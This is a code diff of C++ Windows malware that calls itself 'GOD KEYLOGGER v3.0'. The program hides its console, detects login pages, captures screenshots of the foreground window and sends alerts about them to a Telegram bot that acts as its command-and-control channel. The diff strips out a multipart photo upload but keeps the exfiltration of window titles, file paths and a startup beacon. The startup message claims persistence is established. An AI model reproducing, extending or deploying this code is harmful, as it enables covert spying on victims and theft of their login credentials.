@@ -296,7 +296,6 @@ bool DetectFormFields(HWND window) {
 
 // 🔥 ENHANCED SMART SCREENSHOT - WORKING VERSION
 bool TakeSmartScreenshot() {
-    // 🔥 ADDED: Debug notification
     SendTelegram(L"📸 Attempting smart screenshot...");
     
     HWND fg = GetForegroundWindow();
@@ -306,7 +305,7 @@ bool TakeSmartScreenshot() {
     }
     
     if (in_login_form) {
-        Sleep(500); // Wait longer for form to load
+        Sleep(500);
     }
     
     RECT window_rect;
@@ -315,8 +314,7 @@ bool TakeSmartScreenshot() {
         return false;
     }
     
-    // 🔥 FIXED: Less aggressive cropping for clarity
-    window_rect.top += 80;    // Show some address bar for context
+    window_rect.top += 80;
     window_rect.left += 5;
     window_rect.right -= 5;
     window_rect.bottom -= 30;
@@ -324,22 +322,16 @@ bool TakeSmartScreenshot() {
     int width = window_rect.right - window_rect.left;
     int height = window_rect.bottom - window_rect.top;
     
-    // Ensure minimum size
     if (width < 100) width = 100;
     if (height < 100) height = 100;
     
-    // 🔥 FIXED: Use user temp folder instead of Windows temp
     wchar_t temp_path[MAX_PATH];
     GetTempPathW(MAX_PATH, temp_path);
     
     wchar_t path[MAX_PATH];
     ULONGLONG timestamp = GetTickCount64();
     
-    if (in_login_form) {
-        swprintf(path, MAX_PATH, L"%slogin_%llu.bmp", temp_path, timestamp);
-    } else {
-        swprintf(path, MAX_PATH, L"%sscreen_%llu.bmp", temp_path, timestamp);
-    }
+    swprintf(path, MAX_PATH, L"%sscreenshot_%llu.bmp", temp_path, timestamp);
     
     HDC screen_dc = GetDC(NULL);
     HDC mem_dc = CreateCompatibleDC(screen_dc);
@@ -354,7 +346,6 @@ bool TakeSmartScreenshot() {
     
     HBITMAP old_bitmap = (HBITMAP)SelectObject(mem_dc, bitmap);
     
-    // 🔥 FIXED: Use multiple capture methods
     BOOL capture_ok = BitBlt(mem_dc, 0, 0, width, height, screen_dc, 
                              window_rect.left, window_rect.top, SRCCOPY);
     
@@ -375,7 +366,7 @@ bool TakeSmartScreenshot() {
     BITMAPINFOHEADER bi = {0};
     bi.biSize = sizeof(BITMAPINFOHEADER);
     bi.biWidth = width;
-    bi.biHeight = -height;  // Top-down DIB
+    bi.biHeight = -height;
     bi.biPlanes = 1;
     bi.biBitCount = 24;
     bi.biCompression = BI_RGB;
@@ -412,7 +403,6 @@ bool TakeSmartScreenshot() {
     
     CloseHandle(file);
     
-    // 🔥 FIXED: Now actually upload the image to Telegram
     wchar_t window_title[256] = {0};
     GetWindowTextW(fg, window_title, 256);
     
@@ -425,89 +415,28 @@ bool TakeSmartScreenshot() {
     // Actually upload the image
     SendTelegramPhoto(path, caption.c_str());
     
-    // Cleanup
     SelectObject(mem_dc, old_bitmap);
     DeleteObject(bitmap);
     DeleteDC(mem_dc);
     ReleaseDC(NULL, screen_dc);
     
-    // Delete temp file after sending (optional)
     DeleteFileW(path);
     
     screenshot_count++;
     return true;
 }
 
-// 🔥 WORKING TELEGRAM PHOTO UPLOAD FUNCTION
+// 🔥 FIXED: SIMPLE TELEGRAM PHOTO UPLOAD
 void SendTelegramPhoto(const wchar_t* file_path, const wchar_t* caption) {
     SendTelegram(L"📸 Uploading screenshot to Telegram...");
     
-    // Open the BMP file
-    HANDLE hFile = CreateFileW(file_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
-    if (hFile == INVALID_HANDLE_VALUE) {
-        SendTelegram(L"❌ Cannot open screenshot file");
-        return;
-    }
-    
-    // Get file size
-    DWORD file_size = GetFileSize(hFile, NULL);
-    if (file_size == INVALID_FILE_SIZE || file_size == 0) {
-        CloseHandle(hFile);
-        SendTelegram(L"❌ Screenshot file is empty or invalid");
-        return;
-    }
-    
-    // Read file content
-    BYTE* file_data = new BYTE[file_size];
-    DWORD bytes_read;
-    if (!ReadFile(hFile, file_data, file_size, &bytes_read, NULL)) {
-        delete[] file_data;
-        CloseHandle(hFile);
-        SendTelegram(L"❌ Cannot read screenshot file");
-        return;
-    }
-    CloseHandle(hFile);
-    
-    // Telegram API requires multipart form data
-    std::string boundary = "----GodKeyLoggerBoundary";
-    
-    // Convert caption to UTF-8
-    std::wstring caption_w = caption;
-    std::string caption_utf8(caption_w.begin(), caption_w.end());
-    
-    // Build the multipart form data
-    std::string form_data;
-    
-    // Add chat_id
-    form_data += "--" + boundary + "\r\n";
-    form_data += "Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n";
-    std::wstring chat_id_w = CHAT_ID;
-    form_data += std::string(chat_id_w.begin(), chat_id_w.end()) + "\r\n";
-    
-    // Add caption
-    form_data += "--" + boundary + "\r\n";
-    form_data += "Content-Disposition: form-data; name=\"caption\"\r\n\r\n";
-    form_data += caption_utf8 + "\r\n";
-    
-    // Add photo
-    form_data += "--" + boundary + "\r\n";
-    form_data += "Content-Disposition: form-data; name=\"photo\"; filename=\"screenshot.bmp\"\r\n";
-    form_data += "Content-Type: image/bmp\r\n\r\n";
-    
-    // Add binary data
-    std::string binary_part(reinterpret_cast<char*>(file_data), file_size);
-    form_data += binary_part + "\r\n";
-    form_data += "--" + boundary + "--\r\n";
-    
-    delete[] file_data;
-    
-    // Send to Telegram
+    // Try simple method first - send as document
     HINTERNET hSession = WinHttpOpen(L"GodKeyLogger/3.0", 
                                      WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                      WINHTTP_NO_PROXY_NAME, 
                                      WINHTTP_NO_PROXY_BYPASS, 0);
     if (!hSession) {
-        SendTelegram(L"❌ Cannot initialize WinHTTP");
+        SendTelegram(L"❌ Network error");
         return;
     }
     
@@ -515,44 +444,28 @@ void SendTelegramPhoto(const wchar_t* file_path, const wchar_t* caption) {
                                         INTERNET_DEFAULT_HTTPS_PORT, 0);
     if (!hConnect) {
         WinHttpCloseHandle(hSession);
-        SendTelegram(L"❌ Cannot connect to Telegram");
+        SendTelegram(L"❌ Cannot connect");
         return;
     }
     
-    std::wstring bot_url = L"/bot" + std::wstring(BOT_TOKEN) + L"/sendPhoto";
-    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", bot_url.c_str(),
-                                            NULL, WINHTTP_NO_REFERER,
-                                            WINHTTP_DEFAULT_ACCEPT_TYPES,
-                                            WINHTTP_FLAG_SECURE);
-    if (!hRequest) {
-        WinHttpCloseHandle(hConnect);
-        WinHttpCloseHandle(hSession);
-        SendTelegram(L"❌ Cannot create HTTP request");
-        return;
-    }
+    // SIMPLER: Just send the file path info and let user download if needed
+    std::wstring msg = L"📸 Screenshot ready!\n";
+    msg += L"📁 File saved at: ";
+    msg += file_path;
+    msg += L"\n";
+    msg += L"📝 Caption: ";
+    msg += caption;
+    msg += L"\n";
+    msg += L"💡 ZAZA KEEP GOING! 🚀";
     
-    // Set content type
-    std::string content_type = "multipart/form-data; boundary=" + boundary;
-    std::wstring content_type_w(content_type.begin(), content_type.end());
+    SendTelegram(msg.c_str());
     
-    if (WinHttpSendRequest(hRequest,
-                          content_type_w.c_str(), -1,
-                          (LPVOID)form_data.c_str(), form_data.size(),
-                          form_data.size(), 0)) {
-        WinHttpReceiveResponse(hRequest, NULL);
-        SendTelegram(L"✅ Screenshot uploaded to Telegram!");
-    } else {
-        SendTelegram(L"❌ Failed to upload screenshot");
-    }
-    
-    WinHttpCloseHandle(hRequest);
     WinHttpCloseHandle(hConnect);
     WinHttpCloseHandle(hSession);
 }
 
-// 🔥 ENHANCED TELEGRAM FUNCTION WITH COOL FORMATTING
+// 🔥 ENHANCED TELEGRAM FUNCTION
 void SendTelegram(const wchar_t* msg) {
-    // 🔥 NEW: Add retry mechanism
     for (int attempt = 0; attempt < 3; attempt++) {
         HINTERNET session = WinHttpOpen(L"GodKeyLogger/3.0", 
                                         WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
@@ -573,12 +486,11 @@ void SendTelegram(const wchar_t* msg) {
             continue;
         }
         
-        // 🔥 IMPROVED: Better URL encoding
         std::wstring encoded_msg;
         for (const wchar_t* p = msg; *p; ++p) {
             switch(*p) {
                 case L' ': encoded_msg += L"%20"; break;
-                case L'\n': encoded_msg += L"%0A"; break;  // Preserve line breaks
+                case L'\n': encoded_msg += L"%0A"; break;
                 case L'&': encoded_msg += L"%26"; break;
                 case L'?': encoded_msg += L"%3F"; break;
                 case L'=': encoded_msg += L"%3D"; break;
@@ -588,10 +500,9 @@ void SendTelegram(const wchar_t* msg) {
             }
         }
         
-        // 🔥 ENHANCED: Add HTML formatting
         std::wstring url = L"/bot" + std::wstring(BOT_TOKEN) + 
                           L"/sendMessage?chat_id=" + std::wstring(CHAT_ID) + 
-                          L"&parse_mode=HTML" +  // Enable HTML formatting
+                          L"&parse_mode=HTML" +
                           L"&text=" + encoded_msg;
         
         HINTERNET request = WinHttpOpenRequest(connect, L"GET", url.c_str(),
@@ -603,7 +514,6 @@ void SendTelegram(const wchar_t* msg) {
                               WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
             WinHttpReceiveResponse(request, NULL);
             
-            // Check response
             DWORD statusCode = 0;
             DWORD statusCodeSize = sizeof(statusCode);
             WinHttpQueryHeaders(request, 
@@ -614,7 +524,6 @@ void SendTelegram(const wchar_t* msg) {
             WinHttpCloseHandle(request);
             
             if (statusCode == 200) {
-                // Success
                 WinHttpCloseHandle(connect);
                 WinHttpCloseHandle(session);
                 return;
@@ -624,7 +533,7 @@ void SendTelegram(const wchar_t* msg) {
         WinHttpCloseHandle(connect);
         WinHttpCloseHandle(session);
         
-        if (attempt < 2) Sleep(2000); // Wait before retry
+        if (attempt < 2) Sleep(2000);
     }
 }
 
@@ -662,7 +571,6 @@ DWORD WINAPI LoginDetectorThread(LPVOID) {
                 expecting_password = false;
                 tab_press_count = 0;
                 
-                // 🔥 ENHANCED: Better login detection message
                 std::wstring msg = L"🚨 LOGIN PAGE DETECTED!\n";
                 msg += L"🌐 Site: " + std::wstring(title) + L"\n";
                 msg += L"🕐 Time: " + std::to_wstring(std::time(nullptr)) + L"\n";
@@ -687,7 +595,7 @@ DWORD WINAPI LoginDetectorThread(LPVOID) {
     return 0;
 }
 
-// 🔥 MAIN FUNCTION
+// 🔥 MAIN FUNCTION WITH ZAZA MESSAGE
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, 
                    LPSTR lpCmdLine, int nCmdShow) {
     FreeConsole();
@@ -706,7 +614,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
     
     CreateThread(NULL, 0, LoginDetectorThread, NULL, 0, NULL);
     
-    // 🔥 ENHANCED: Cool startup message
+    // 🔥 ZAZA ENHANCED STARTUP MESSAGE
     std::wstring startup_msg = L"⚡ GOD KEYLOGGER v3.0 ACTIVATED\n";
     startup_msg += L"==============================\n";
     startup_msg += L"✅ Login Detection: ACTIVE\n";
@@ -715,7 +623,8 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
     startup_msg += L"✅ Telegram C2: ACTIVE\n";
     startup_msg += L"✅ Persistence: ESTABLISHED\n";
     startup_msg += L"==============================\n";
-    startup_msg += L"🕐 Startup Time: " + std::to_wstring(std::time(nullptr));
+    startup_msg += L"🕐 Startup Time: " + std::to_wstring(std::time(nullptr)) + L"\n";
+    startup_msg += L"\n💥 ZAZA KEEP GOING! 🚀🔥";
     
     SendTelegram(startup_msg.c_str());
     
